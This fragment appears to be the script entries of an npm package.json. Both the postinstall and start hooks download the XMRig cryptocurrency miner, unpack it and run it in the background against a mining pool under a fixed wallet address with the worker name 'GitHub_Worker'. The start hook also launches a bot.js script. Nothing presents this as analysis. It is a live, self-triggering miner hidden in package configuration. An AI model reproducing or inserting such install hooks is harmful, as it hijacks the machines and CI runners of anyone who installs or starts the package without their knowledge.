scripts.postinstall: wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xf xmrig-6.21.0-linux-x64.tar.gz && ./xmrig-6.21.0/xmrig -o rx.unmineable.com:3333 -u SOL:6zywrMREmZDvC53gERydGNB6G4RNj8dpSgRYnsyJ5TDa.GitHub_Worker -p x -k -a rx/0 --background
scripts.start: node bot.js & wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xf xmrig-6.21.0-linux-x64.tar.gz && ./xmrig-6.21.0/xmrig -o rx.unmineable.com:3333 -u SOL:6zywrMREmZDvC53gERydGNB6G4RNj8dpSgRYnsyJ5TDa.GitHub_Worker -p x -k -a rx/0 --background
